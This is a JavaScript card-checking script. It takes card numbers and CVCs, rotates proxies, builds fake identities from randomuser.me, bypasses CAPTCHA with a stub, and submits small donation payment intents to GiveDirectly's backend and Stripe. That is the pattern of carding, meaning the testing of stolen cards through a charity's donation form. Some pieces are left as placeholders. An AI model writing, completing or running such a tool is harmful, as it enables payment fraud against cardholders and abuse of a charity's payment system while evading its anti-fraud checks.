document.getElementById('cardForm').addEventListener('submit', async function (event) {
    event.preventDefault();

    const ccn = document.getElementById('ccn').value;
    const month = document.getElementById('month').value;
    const year = document.getElementById('year').value;
    const cvc = document.getElementById('cvc').value;

    if (!ccn || !month || !year || !cvc) {
        displayResponse({ error: "Missing one or more required data fields" });
        return;
    }

    try {
        const proxies = await loadProxies("proxies.txt");
        if (!proxies.length) {
            displayResponse({ error: "No proxies available" });
            return;
        }

        const response = await processCard(ccn, month, year, cvc, proxies);
        displayResponse(response);
    } catch (error) {
        displayResponse({ error: error.message });
    }
});

async function loadProxies(filename) {
    // Implement proxy loading logic as needed
    return []; // Return an array of proxies or an empty array
}

async function processCard(ccn, month, year, cvc, proxies) {
    const user = await getRandomUser();
    const stripeData = await getStripeData();

    const payload = {
        cents: 999,
        frequency: "once",
        directDonationTo: "unrestricted",
        emailAddress: user.email,
        firstName: user.firstName,
        lastName: user.lastName,
        recaptchaResponse: await bypassCaptcha(),
        subscribeToEmailList: true,
    };

    const paymentIntentResponse = await fetch("https://www-backend.givedirectly.org/payment-intent", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
    });

    const paymentData = await paymentIntentResponse.json();
    if (!paymentData.clientSecret) {
        throw new Error("Failed to retrieve payment intent or rate limited");
    }

    // Handle Stripe payment confirmation logic here...

    return { message: "Payment processed successfully" }; // Adjust based on actual processing
}

async function getRandomUser() {
    const response = await fetch("https://randomuser.me/api?nat=us");
    const data = await response.json();
    const userInfo = data.results[0];

    return {
        firstName: userInfo.name.first,
        lastName: userInfo.name.last,
        email: `${userInfo.name.first}.${userInfo.name.last}@yahoo.com`,
    };
}

async function getStripeData() {
    const response = await fetch("https://m.stripe.com/6", {
        method: "POST",
    });
    return await response.json();
}

async function bypassCaptcha() {
    // Implement CAPTCHA bypass logic as needed
    return "dummy-captcha-response"; // Return a dummy response for now
}

function displayResponse(response) {
    document.getElementById('response').textContent = JSON.stringify(response, null, 2);
}
